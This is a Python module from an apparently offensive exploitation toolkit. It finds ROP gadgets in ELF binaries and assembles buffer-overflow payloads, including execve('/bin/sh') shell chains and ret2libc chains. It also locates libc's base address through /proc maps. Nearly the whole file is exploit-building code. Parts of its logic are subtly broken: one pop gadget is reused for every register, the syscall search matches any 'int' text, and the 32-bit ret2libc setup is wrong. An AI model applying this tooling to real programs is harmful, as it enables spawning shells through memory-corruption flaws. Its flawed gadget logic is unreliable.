#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import struct
import os
from typing import List, Dict, Any, Optional, Tuple, Union
from core.output_handler import print_info, print_success, print_error, print_warning
from core.lib.elf_analyzer import ELFAnalyzer
from core.lib.disassembler import x86Disassembler, ROPGadgetFinder, Instruction

class ROPGadget:
    """Represents a ROP gadget"""
    
    def __init__(self, address: int, instruction: str, registers: List[str] = None, 
                 stack_operations: int = 0, description: str = "", gadget_type: str = "unknown"):
        """
        Initialize a ROP gadget
        
        Args:
            address: Memory address of the gadget
            instruction: Assembly instruction(s)
            registers: List of registers used/modified
            stack_operations: Number of stack operations (positive = pop, negative = push)
            description: Human-readable description
            gadget_type: Type of gadget (ret, pop_chain, syscall, etc.)
        """
        self.address = address
        self.instruction = instruction
        self.registers = registers or []
        self.stack_operations = stack_operations
        self.description = description
        self.gadget_type = gadget_type
        self.arch = "x86"  # Default architecture
        self.bits = 32     # Default bitness
        self.length = 1    # Number of instructions
    
    def set_architecture(self, arch: str, bits: int):
        """Set the architecture and bitness"""
        self.arch = arch.lower()
        self.bits = bits
    
    def get_packed_address(self, endian: str = "little") -> bytes:
        """Get the gadget address packed for the current architecture"""
        if self.bits == 32:
            return struct.pack("<I" if endian == "little" else ">I", self.address)
        else:  # 64-bit
            return struct.pack("<Q" if endian == "little" else ">Q", self.address)
    
    def __repr__(self) -> str:
        return f"ROPGadget(0x{self.address:x}, '{self.instruction}')"
    
    def __str__(self) -> str:
        return f"0x{self.address:x}: {self.instruction}"

class ROPChain:
    """Represents a ROP chain"""
    
    def __init__(self, arch: str = "x86", bits: int = 32, endian: str = "little"):
        """
        Initialize a ROP chain
        
        Args:
            arch: Architecture (x86, x64, arm, etc.)
            bits: Bitness (32 or 64)
            endian: Endianness (little or big)
        """
        self.arch = arch.lower()
        self.bits = bits
        self.endian = endian
        self.gadgets: List[ROPGadget] = []
        self.payload: bytes = b""
        self.stack_offset = 0
        self.registers = {}
        
        # Architecture-specific register mappings
        self.register_mappings = {
            "x86": {
                "eax": 0, "ebx": 1, "ecx": 2, "edx": 3,
                "esi": 4, "edi": 5, "ebp": 6, "esp": 7
            },
            "x64": {
                "rax": 0, "rbx": 1, "rcx": 2, "rdx": 3,
                "rsi": 4, "rdi": 5, "rbp": 6, "rsp": 7,
                "r8": 8, "r9": 9, "r10": 10, "r11": 11,
                "r12": 12, "r13": 13, "r14": 14, "r15": 15
            }
        }
    
    def add_gadget(self, gadget: ROPGadget) -> None:
        """Add a gadget to the chain"""
        gadget.set_architecture(self.arch, self.bits)
        self.gadgets.append(gadget)
        self.payload += gadget.get_packed_address(self.endian)
        self.stack_offset += self.bits // 8
    
    def add_value(self, value: Union[int, str, bytes]) -> None:
        """Add a value to the chain"""
        if isinstance(value, str):
            # String value
            if self.bits == 32:
                # Pad string to 4-byte boundary
                padded = value.encode() + b"\x00" * (4 - len(value) % 4)
                for i in range(0, len(padded), 4):
                    val = struct.unpack("<I", padded[i:i+4])[0]
                    self.payload += struct.pack("<I" if self.endian == "little" else ">I", val)
                    self.stack_offset += 4
            else:  # 64-bit
                # Pad string to 8-byte boundary
                padded = value.encode() + b"\x00" * (8 - len(value) % 8)
                for i in range(0, len(padded), 8):
                    val = struct.unpack("<Q", padded[i:i+8])[0]
                    self.payload += struct.pack("<Q" if self.endian == "little" else ">Q", val)
                    self.stack_offset += 8
        elif isinstance(value, bytes):
            # Raw bytes
            self.payload += value
            self.stack_offset += len(value)
        else:
            # Integer value
            if self.bits == 32:
                self.payload += struct.pack("<I" if self.endian == "little" else ">I", value)
                self.stack_offset += 4
            else:
                self.payload += struct.pack("<Q" if self.endian == "little" else ">Q", value)
                self.stack_offset += 8
    
    def set_register(self, register: str, value: int) -> None:
        """Set a register value for the chain"""
        self.registers[register] = value
    
    def get_register(self, register: str) -> Optional[int]:
        """Get a register value"""
        return self.registers.get(register)
    
    def build_payload(self) -> bytes:
        """Build the complete ROP payload"""
        return self.payload
    
    def get_chain_info(self) -> Dict[str, Any]:
        """Get information about the ROP chain"""
        return {
            "architecture": self.arch,
            "bits": self.bits,
            "endian": self.endian,
            "gadget_count": len(self.gadgets),
            "payload_size": len(self.payload),
            "stack_offset": self.stack_offset,
            "registers": self.registers
        }
    
    def __repr__(self) -> str:
        return f"ROPChain({self.arch}{self.bits}, {len(self.gadgets)} gadgets, {len(self.payload)} bytes)"

class ROPExploit:
    """Complete ROP exploit builder - completely autonomous"""
    
    def __init__(self, binary_path: str, arch: str = "x86", bits: int = 32):
        """
        Initialize a ROP exploit
        
        Args:
            binary_path: Path to the target binary
            arch: Architecture
            bits: Bitness
        """
        self.binary_path = binary_path
        self.arch = arch.lower()
        self.bits = bits
        self.elf_analyzer = None
        self.disassembler = None
        self.gadget_finder = None
        self.gadgets: List[ROPGadget] = []
        self.rop_chain = ROPChain(arch, bits)
        self.vulnerability_info = {}
        self.exploit_payload = b""
        
        self._initialize_analysis()
    
    def _initialize_analysis(self):
        """Initialize binary analysis"""
        try:
            # Analyze ELF binary
            self.elf_analyzer = ELFAnalyzer(self.binary_path)
            
            # Get architecture info from ELF
            elf_arch = self.elf_analyzer.elf_header.get_architecture()
            if elf_arch != "unknown":
                self.arch = elf_arch.lower()
            
            self.bits = 64 if self.elf_analyzer.elf_header.is_64bit else 32
            
            # Initialize disassembler
            self.disassembler = x86Disassembler(self.bits == 64)
            self.gadget_finder = ROPGadgetFinder(self.disassembler)
            
            print_success(f"Initialized ROP exploit for {self.arch}{self.bits}")
            
        except Exception as e:
            print_error(f"Failed to initialize analysis: {e}")
            raise
    
    def find_gadgets(self, max_length: int = 5) -> List[ROPGadget]:
        """
        Find ROP gadgets in the binary using our autonomous analyzer
        
        Args:
            max_length: Maximum gadget length
            
        Returns:
            List of found gadgets
        """
        try:
            print_info("Searching for ROP gadgets...")
            
            # Get executable sections
            exec_sections = self.elf_analyzer.get_executable_sections()
            if not exec_sections:
                print_warning("No executable sections found")
                return []
            
            all_gadgets = []
            
            for section in exec_sections:
                print_info(f"Analyzing section: {self.elf_analyzer.get_section_name(section)}")
                
                # Extract section data
                start = section.sh_offset
                end = start + section.sh_size
                if end > len(self.elf_analyzer.data):
                    continue
                
                section_data = self.elf_analyzer.data[start:end]
                
                # Disassemble section
                instructions = self.disassembler.disassemble(section_data, section.sh_addr)
                print_info(f"Disassembled {len(instructions)} instructions")
                
                # Find gadgets in this section
                section_gadgets = self.gadget_finder.find_gadgets(instructions, max_length)
                
                # Convert to ROPGadget objects
                for gadget_info in section_gadgets:
                    gadget = self._create_gadget_from_info(gadget_info)
                    if gadget:
                        all_gadgets.append(gadget)
            
            self.gadgets = all_gadgets
            print_success(f"Found {len(all_gadgets)} ROP gadgets")
            
            # Show some examples
            if all_gadgets:
                print_info("Sample gadgets found:")
                for i, gadget in enumerate(all_gadgets[:5]):
                    print(f"  {i+1}. {gadget}")
            
            return all_gadgets
            
        except Exception as e:
            print_error(f"Failed to find gadgets: {e}")
            return []
    
    def _create_gadget_from_info(self, gadget_info: Dict[str, Any]) -> Optional[ROPGadget]:
        """Create ROPGadget from gadget finder info"""
        try:
            # Create instruction string
            instruction_strs = [str(inst) for inst in gadget_info['instructions']]
            instruction = " ; ".join(instruction_strs)
            
            gadget = ROPGadget(
                address=gadget_info['address'],
                instruction=instruction,
                registers=gadget_info['registers'],
                stack_operations=gadget_info['stack_operations'],
                description=f"{gadget_info['type']} gadget",
                gadget_type=gadget_info['type']
            )
            
            gadget.set_architecture(self.arch, self.bits)
            gadget.length = gadget_info['length']
            
            return gadget
            
        except Exception as e:
            print_warning(f"Failed to create gadget: {e}")
            return None
    
    def search_gadgets(self, pattern: str) -> List[ROPGadget]:
        """Search for gadgets matching a pattern"""
        matching = []
        for gadget in self.gadgets:
            if pattern.lower() in gadget.instruction.lower():
                matching.append(gadget)
        return matching
    
    def find_pop_gadgets(self, count: int = 1) -> List[ROPGadget]:
        """Find gadgets that pop a specific number of values"""
        matching = []
        for gadget in self.gadgets:
            if gadget.stack_operations == count:
                matching.append(gadget)
        return matching
    
    def find_syscall_gadgets(self) -> List[ROPGadget]:
        """Find syscall gadgets"""
        return self.search_gadgets("syscall") + self.search_gadgets("int")
    
    def find_gadgets_by_register(self, register: str) -> List[ROPGadget]:
        """Find gadgets that use a specific register"""
        matching = []
        for gadget in self.gadgets:
            if register in gadget.registers:
                matching.append(gadget)
        return matching
    
    def build_shellcode_chain(self, shellcode: bytes, base_address: int = 0) -> ROPChain:
        """
        Build a ROP chain to execute shellcode
        
        Args:
            shellcode: Shellcode to execute
            base_address: Base address for calculations
            
        Returns:
            ROPChain object
        """
        chain = ROPChain(self.arch, self.bits)
        
        # Find gadgets for setting up registers
        pop_gadgets = self.find_pop_gadgets(1)
        if not pop_gadgets:
            print_error("No pop gadgets found")
            return chain
        
        # Find syscall gadgets
        syscall_gadgets = self.find_syscall_gadgets()
        if not syscall_gadgets:
            print_error("No syscall gadgets found")
            return chain
        
        print_info("Building shellcode ROP chain...")
        
        # Build the chain
        if self.arch == "x86":
            # x86 syscall setup
            if self.bits == 32:
                # Set up registers for execve("/bin/sh", NULL, NULL)
                chain.add_gadget(pop_gadgets[0])  # pop eax
                chain.add_value(11)  # execve syscall number
                
                chain.add_gadget(pop_gadgets[0])  # pop ebx
                chain.add_value(base_address + len(chain.payload) + 20)  # pointer to "/bin/sh"
                
                chain.add_gadget(pop_gadgets[0])  # pop ecx
                chain.add_value(0)  # NULL
                
                chain.add_gadget(pop_gadgets[0])  # pop edx
                chain.add_value(0)  # NULL
                
                # Add syscall
                chain.add_gadget(syscall_gadgets[0])
                
                # Add "/bin/sh" string
                chain.add_value("/bin/sh")
            else:  # x64
                # x64 syscall setup
                chain.add_gadget(pop_gadgets[0])  # pop rax
                chain.add_value(59)  # execve syscall number
                
                chain.add_gadget(pop_gadgets[0])  # pop rdi
                chain.add_value(base_address + len(chain.payload) + 20)  # pointer to "/bin/sh"
                
                chain.add_gadget(pop_gadgets[0])  # pop rsi
                chain.add_value(0)  # NULL
                
                chain.add_gadget(pop_gadgets[0])  # pop rdx
                chain.add_value(0)  # NULL
                
                # Add syscall
                chain.add_gadget(syscall_gadgets[0])
                
                # Add "/bin/sh" string
                chain.add_value("/bin/sh")
        
        print_success(f"Built shellcode ROP chain: {len(chain.payload)} bytes")
        return chain
    
    def build_ret2libc_chain(self, libc_base: int, system_addr: int, 
                           binsh_addr: int, exit_addr: int = 0) -> ROPChain:
        """
        Build a ret2libc ROP chain
        
        Args:
            libc_base: Base address of libc
            system_addr: Address of system function
            binsh_addr: Address of "/bin/sh" string
            exit_addr: Address of exit function (optional)
            
        Returns:
            ROPChain object
        """
        chain = ROPChain(self.arch, self.bits)
        
        # Find gadgets for setting up function calls
        pop_gadgets = self.find_pop_gadgets(1)
        if not pop_gadgets:
            print_error("No pop gadgets found")
            return chain
        
        print_info("Building ret2libc ROP chain...")
        
        # Build ret2libc chain
        if self.bits == 32:
            # x86 ret2libc
            chain.add_gadget(pop_gadgets[0])  # pop eax
            chain.add_value(system_addr)
            
            chain.add_gadget(pop_gadgets[0])  # pop ebx
            chain.add_value(binsh_addr)
            
            # Add return address (can be exit or system again)
            if exit_addr:
                chain.add_value(exit_addr)
            else:
                chain.add_value(system_addr)
        else:  # x64
            # x64 ret2libc
            chain.add_gadget(pop_gadgets[0])  # pop rax
            chain.add_value(system_addr)
            
            chain.add_gadget(pop_gadgets[0])  # pop rdi
            chain.add_value(binsh_addr)
            
            # Add return address
            if exit_addr:
                chain.add_value(exit_addr)
            else:
                chain.add_value(system_addr)
        
        print_success(f"Built ret2libc ROP chain: {len(chain.payload)} bytes")
        return chain
    
    def generate_payload(self, overflow_size: int, rop_chain: ROPChain) -> bytes:
        """
        Generate complete exploit payload
        
        Args:
            overflow_size: Size of buffer overflow
            rop_chain: ROP chain to use
            
        Returns:
            Complete exploit payload
        """
        payload = b"A" * overflow_size  # Buffer overflow
        payload += rop_chain.build_payload()
        
        self.exploit_payload = payload
        print_success(f"Generated exploit payload: {len(payload)} bytes")
        return payload
    
    def save_payload(self, filename: str) -> bool:
        """Save the exploit payload to a file"""
        try:
            with open(filename, 'wb') as f:
                f.write(self.exploit_payload)
            print_success(f"Payload saved to {filename}")
            return True
        except Exception as e:
            print_error(f"Failed to save payload: {e}")
            return False
    
    def get_exploit_info(self) -> Dict[str, Any]:
        """Get information about the exploit"""
        return {
            "binary": self.binary_path,
            "architecture": f"{self.arch}{self.bits}",
            "gadgets_found": len(self.gadgets),
            "payload_size": len(self.exploit_payload),
            "rop_chain_info": self.rop_chain.get_chain_info(),
            "binary_info": self.elf_analyzer.get_binary_info() if self.elf_analyzer else {}
        }

class ROPUtils:
    """Utility functions for ROP exploitation"""
    
    @staticmethod
    def find_libc_base(pid: int) -> Optional[int]:
        """Find libc base address for a process"""
        try:
            with open(f"/proc/{pid}/maps", 'r') as f:
                for line in f:
                    if 'libc' in line and 'r-xp' in line:
                        base_addr = int(line.split('-')[0], 16)
                        return base_addr
        except Exception as e:
            print_error(f"Failed to find libc base: {e}")
        return None
    
    @staticmethod
    def find_string_address(binary_path: str, string: str) -> Optional[int]:
        """Find address of a string in binary"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
                offset = content.find(string.encode())
                if offset != -1:
                    return offset
        except Exception as e:
            print_error(f"Failed to find string: {e}")
        return None
    
    @staticmethod
    def calculate_offset(overflow_size: int, rop_chain_size: int) -> int:
        """Calculate the offset for ROP chain placement"""
        return overflow_size - rop_chain_size
    
    @staticmethod
    def create_nop_sled(length: int) -> bytes:
        """Create a NOP sled"""
        if length <= 0:
            return b""
        return b"\x90" * length
    
    @staticmethod
    def align_address(address: int, alignment: int = 4) -> int:
        """Align address to specified boundary"""
        return (address + alignment - 1) & ~(alignment - 1)
    
    @staticmethod
    def pack_address(address: int, bits: int = 32, endian: str = "little") -> bytes:
        """Pack address for the specified architecture"""
        if bits == 32:
            return struct.pack("<I" if endian == "little" else ">I", address)
        else:
            return struct.pack("<Q" if endian == "little" else ">Q", address)
    
    @staticmethod
    def create_rop_chain_from_gadgets(gadgets: List[ROPGadget], 
                                    values: List[Union[int, str, bytes]]) -> ROPChain:
        """Create a ROP chain from a list of gadgets and values"""
        if len(gadgets) != len(values):
            print_error("Number of gadgets must match number of values")
            return ROPChain()
        
        chain = ROPChain()
        for gadget, value in zip(gadgets, values):
            chain.add_gadget(gadget)
            chain.add_value(value)
        
        return chain
    
    @staticmethod
    def analyze_binary(binary_path: str) -> Dict[str, Any]:
        """Analyze a binary and return comprehensive information"""
        try:
            analyzer = ELFAnalyzer(binary_path)
            return analyzer.get_binary_info()
        except Exception as e:
            print_error(f"Failed to analyze binary: {e}")
            return {}
    
    @staticmethod
    def find_rop_gadgets_autonomous(binary_path: str, max_length: int = 5) -> List[ROPGadget]:
        """Find ROP gadgets in a binary using autonomous analysis"""
        try:
            exploit = ROPExploit(binary_path)
            return exploit.find_gadgets(max_length)
        except Exception as e:
            print_error(f"Failed to find gadgets: {e}")
            return []
    
    @staticmethod
    def create_simple_rop_chain(gadgets: List[ROPGadget], 
                              values: List[Union[int, str, bytes]], 
                              arch: str = "x86", bits: int = 32) -> ROPChain:
        """Create a simple ROP chain from gadgets and values"""
        chain = ROPChain(arch, bits)
        
        for gadget, value in zip(gadgets, values):
            chain.add_gadget(gadget)
            chain.add_value(value)
        
        return chain